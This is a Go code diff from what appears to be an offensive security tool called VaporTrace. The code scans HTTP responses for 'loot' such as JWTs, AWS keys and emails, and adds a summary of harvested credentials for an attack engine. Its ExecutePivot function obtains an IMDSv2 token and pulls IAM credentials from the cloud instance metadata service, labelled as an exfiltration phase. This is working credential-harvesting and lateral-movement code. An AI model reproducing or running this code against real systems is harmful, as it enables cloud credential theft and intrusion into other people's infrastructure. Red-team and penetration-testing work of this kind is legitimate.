@@ -10,22 +10,26 @@ import (
 
 	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
 	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
-	"github.com/pterm/pterm"
 )
 
-// Finding defines the structure for in-memory tracking (Legacy support)
 type Finding struct {
 	Type   string
 	Value  string
 	Source string
 }
 
+// LootSummary provides a high-level boolean map for the Strategic Engine
+type LootSummary struct {
+	HasJWT     bool
+	HasAWS     bool
+	HasPII     bool
+	Credential string // A sample valid credential for use
+}
+
 var (
 	Vault    []Finding
 	vaultMux sync.Mutex
 
-	// REGLA DE ORO: Corregido el escape de puntos en raw strings (backticks)
-	// Se expande AWS_KEY para detectar variaciones de longitud en entornos de test.
 	Patterns = map[string]*regexp.Regexp{
 		"AWS_KEY":       regexp.MustCompile(`(AKIA|ASIA)[0-9A-Z]{16,20}`),
 		"JWT_TOKEN":     regexp.MustCompile(`eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*`),
@@ -35,7 +39,34 @@ var (
 	}
 )
 
-// ScanForLoot: Central Nerve Center for Discovery
+// GetLootSummary aggregates findings for the Neuro-Engine
+func GetLootSummary() LootSummary {
+	vaultMux.Lock()
+	defer vaultMux.Unlock()
+
+	summary := LootSummary{}
+	for _, f := range Vault {
+		if f.Type == "JWT_TOKEN" {
+			summary.HasJWT = true
+			if summary.Credential == "" {
+				summary.Credential = f.Value
+			}
+		}
+		if f.Type == "AWS_KEY" || f.Type == "CLOUD_CREDS" {
+			summary.HasAWS = true
+		}
+		if f.Type == "EMAIL" {
+			summary.HasPII = true
+		}
+	}
+	// Check Session Overrides
+	if CurrentSession.AttackerToken != "" {
+		summary.HasJWT = true
+		summary.Credential = CurrentSession.AttackerToken
+	}
+	return summary
+}
+
 func ScanForLoot(body string, url string) {
 	vaultMux.Lock()
 	defer vaultMux.Unlock()
@@ -58,13 +89,10 @@ func ScanForLoot(body string, url string) {
 				}
 				Vault = append(Vault, finding)
 
-				// ROUTING: Send to F3 Loot Tab
 				utils.LogLoot(label, m, url)
+				// Log to TUI instead of pterm to avoid status bar contamination
+				utils.TacticalLog(fmt.Sprintf("[yellow]LOOT:[-] [red]%s[-] [yellow]discovered in[-] [cyan]%s[-]", label, url))
 
-				pterm.Warning.Prefix = pterm.Prefix{Text: "LOOT", Style: pterm.NewStyle(pterm.BgYellow, pterm.FgBlack)}
-				pterm.Warning.Printfln("New %s found in response from %s", label, url)
-
-				// Persistir también en base de datos centralizada
 				db.LogQueue <- db.Finding{
 					Phase:   "PHASE VIII: EXFIL",
 					Target:  url,
@@ -76,13 +104,11 @@ func ScanForLoot(body string, url string) {
 	}
 }
 
-// ExecutePivot performs specialized cloud-metadata harvesting
 func ExecutePivot(target string, source string) {
-	pterm.Info.WithPrefix(pterm.Prefix{Text: "PIVOT"}).Printfln("Initiating lateral harvest on %s", target)
+	utils.TacticalLog("[cyan]PIVOT:[-] Initiating lateral harvest on " + target)
 
 	client := &http.Client{Timeout: 5 * time.Second}
 
-	// Step A: Try IMDSv2 Token acquisition
 	token := ""
 	tokenReq, _ := http.NewRequest("PUT", fmt.Sprintf("http://%s/latest/api/token", target), nil)
 	tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
@@ -94,7 +120,6 @@ func ExecutePivot(target string, source string) {
 		tokenResp.Body.Close()
 	}
 
-	// Step B: Harvest Credentials
 	credURL := fmt.Sprintf("http://%s/latest/meta-data/iam/security-credentials/", target)
 	hReq, _ := http.NewRequest("GET", credURL, nil)
 	if token != "" {
@@ -107,13 +132,11 @@ func ExecutePivot(target string, source string) {
 		hResp.Body.Close()
 
 		lootContent := string(body)
+		// Masked payload logic
+		// payload := fmt.Sprintf("PIVOT_HIT | SRC:%s | DATA:%s", source, lootContent)
+		// masked := GhostMask([]byte(payload), MasterKey)
+		// fmt.Println(masked)
 
-		// 1. Encrypted Exfiltration (Phase 8.3)
-		payload := fmt.Sprintf("PIVOT_HIT | SRC:%s | DATA:%s", source, lootContent)
-		masked := GhostMask([]byte(payload), MasterKey)
-		fmt.Println(masked)
-
-		// 2. In-Memory Vault storage
 		vaultMux.Lock()
 		Vault = append(Vault, Finding{
 			Type:   "CLOUD_CREDS",
@@ -122,7 +145,6 @@ func ExecutePivot(target string, source string) {
 		})
 		vaultMux.Unlock()
 
-		// ROUTING: Send to F3 Loot Tab
 		utils.LogLoot("CLOUD_CREDS", lootContent, source)
 	}
 }
